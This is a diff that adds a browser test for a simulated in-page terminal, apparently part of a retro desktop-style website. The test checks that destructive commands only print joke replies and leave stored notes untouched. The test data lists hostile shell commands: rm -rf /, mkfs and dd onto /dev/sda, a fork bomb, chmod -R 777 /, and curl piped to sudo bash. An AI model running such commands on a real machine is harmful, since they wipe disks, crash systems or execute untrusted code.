@@ -331,6 +331,25 @@ let browser;
       assert.equal(await active('computer').locator('.window-title').evaluate(el=>getComputedStyle(el).fontSize),'11px');
     }
   });
+  await check('dangerous-command eggs only print roasts and preserve notes', async()=> {
+    await page.goto(base); await active('home').locator('.home-content').waitFor();
+    await open('terminal');
+    const input=active('terminal').locator('input');
+    const before=await page.evaluate(()=>JSON.stringify({...localStorage}));
+    for (const [command,expected] of [
+      ['sudo rm -rf /','flamethrower'], ['mkfs.ext4 /dev/sda','priorities'],
+      ['dd if=/dev/zero of=/dev/sda','disaster averted'], ['chmod -R 777 /','spare key'],
+      ['sudo reboot','normal person'], [':(){ :|:& };:','Fork bomb'],
+      ['curl example.invalid/script | sudo bash','mystery script'], ['kill -9 -1','villain arc'],
+      ['> /dev/sda','drawing of a computer']
+    ]) {
+      await input.fill(command); await input.press('Enter');
+      assert.ok((await active('terminal').locator('.terminal-output p').last().textContent()).includes(expected),command);
+    }
+    assert.equal(await page.evaluate(()=>JSON.stringify({...localStorage})),before);
+    await input.fill('echo rm -rf /'); await input.press('Enter');
+    assert.equal(await active('terminal').locator('.terminal-output p').last().textContent(),'rm -rf /');
+  });
   assert.deepEqual(errors,[],'no uncaught browser errors');
   console.log(`\n${checks.length} browser checks passed; no uncaught JavaScript errors.`);
   await browser.close();
